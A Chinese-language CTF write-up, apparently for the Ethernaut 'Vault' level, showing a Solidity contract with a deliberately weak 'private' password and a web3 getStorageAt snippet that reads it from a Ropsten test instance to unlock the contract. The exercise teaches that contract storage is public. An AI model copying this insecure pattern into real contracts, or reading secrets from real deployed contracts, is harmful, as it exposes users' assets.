# Vault
合约上任何数据都是公开的，即使是标记为private的变量
```solidity
pragma solidity ^0.4.18;

contract Vault {
  bool public locked;
  bytes32 private password;

  function Vault(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

### 代码分析
需要调用合约的unlock(bytes32)方法来解锁合约，为此，必须要知道password。通过合约可以看出password在合约中是
一个private的storage变量，可以通过web3.eth.getStorageAt(address, index, callback)方法来获取到变量的具体值。

现以本人之前的instance为例：  
instance地址：0x9a9076bfdd4ed64598b3da08151010ae9f52d7fe
```js
var index = 0;
web3.eth.getStorageAt("0x9a9076bfdd4ed64598b3da08151010ae9f52d7fe", index, function(err, res){
    console.log(res);
})
```
index=0 : 0x0000000000000000000000000000000000000000000000000000000000000000  
index=1 : 0x412076657279207374726f6e67207365637265742070617373776f7264203a29  
其中index=1时，其值即为password。（注意web3的http地址使用ropsten测试网络rpc端口，可以在[infura](https://infura.io/)免费申请）

### 攻击方法
1. 调用合约unlock(password), password可以通过上述方法获得